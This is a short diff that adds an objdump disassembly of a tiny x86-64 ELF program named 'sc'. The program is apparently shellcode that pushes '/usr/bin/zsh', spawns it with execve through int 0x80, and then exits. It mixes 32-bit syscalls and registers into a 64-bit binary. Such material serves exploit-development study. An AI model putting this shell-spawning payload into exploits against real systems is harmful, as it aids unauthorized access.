@@ -1,0 +1,25 @@
+sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+
+sc:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400000 <main>:
+  400000:	31 c0                	xor    eax,eax
+  400002:	83 ec 01             	sub    esp,0x1
+  400005:	88 04 24             	mov    BYTE PTR [rsp],al
+  400008:	68 2f 7a 73 68       	push   0x68737a2f
+  40000d:	68 2f 62 69 6e       	push   0x6e69622f
+  400012:	68 2f 75 73 72       	push   0x7273752f
+  400017:	89 e6                	mov    esi,esp
+  400019:	50                   	push   rax
+  40001a:	56                   	push   rsi
+  40001b:	b0 0b                	mov    al,0xb
+  40001d:	89 f3                	mov    ebx,esi
+  40001f:	89 e1                	mov    ecx,esp
+  400021:	31 d2                	xor    edx,edx
+  400023:	cd 80                	int    0x80
+  400025:	b0 01                	mov    al,0x1
+  400027:	31 db                	xor    ebx,ebx
+  400029:	cd 80                	int    0x80
